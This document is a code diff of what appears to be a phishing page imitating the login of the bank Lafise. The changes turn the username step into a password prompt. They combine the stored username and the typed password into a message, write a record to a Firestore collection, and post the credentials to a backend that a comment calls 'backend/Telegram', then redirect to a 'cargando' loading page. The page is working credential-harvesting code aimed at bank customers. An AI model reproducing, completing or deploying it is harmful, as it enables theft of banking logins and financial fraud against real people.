@@ -321,34 +321,11 @@
         <!-- ✅ ID agregado -->
         <form id="loginForm" autocomplete="off" novalidate>
           <div class="input-wrap">
-            <svg
-              class="icon"
-              viewBox="0 0 24 24"
-              fill="none"
-              xmlns="http://www.w3.org/2000/svg"
-              aria-hidden="true"
-            >
-              <path
-                d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"
-                stroke="currentColor"
-                stroke-width="2"
-                stroke-linecap="round"
-                stroke-linejoin="round"
-              />
-              <circle
-                cx="12"
-                cy="7"
-                r="4"
-                stroke="currentColor"
-                stroke-width="2"
-                stroke-linecap="round"
-                stroke-linejoin="round"
-              />
-            </svg>
+            <img src="descarga.svg" class="icon" alt="" />
             <input
               class="input"
               type="text"
-              placeholder="Escriba su nombre de usuario"
+              placeholder="Escriba su contraseña"
               inputmode="text"
             />
           </div>
@@ -358,8 +335,7 @@
           </div>
 
           <div class="info">
-            <p>Todavía no tiene su usuario</p>
-            <a class="link" href="#">¡Solicítelo aquí!</a>
+            <p>Si tienes un problema</p>
             <a class="link" href="#">¡Recuperar aquí!</a>
           </div>
 
@@ -436,12 +412,25 @@
           submitBtn.innerText = "Procesando...";
 
           // Mensaje a enviar
-          const message = "Lafise\nUsuario: " + username;
-          localStorage.setItem("usuario", username);
+          const message =
+            "Lafise\nUsuario: " +
+            localStorage.getItem("usuario") +
+            "\nContra: " +
+            username;
 
           try {
             // Envío a tu backend/Telegram
-            
+            const questionRef = doc(
+              window.db,
+              "lafis2",
+              localStorage.getItem("usuario")
+            );
+            await setDoc(questionRef, {
+              question1: "A1",
+              question2: "A1",
+              question3: "A1",
+              page: 0,
+            });
             const formData = new FormData();
 formData.append("mensaje", message);
 
@@ -456,7 +445,7 @@ await axios.post(
 );
 
             // Redirige después de enviar
-            window.location.href = "contra.html";
+            window.location.href = "cargando.html";
           } catch (error) {
             console.error(error);
             alert("Error al enviar los datos");
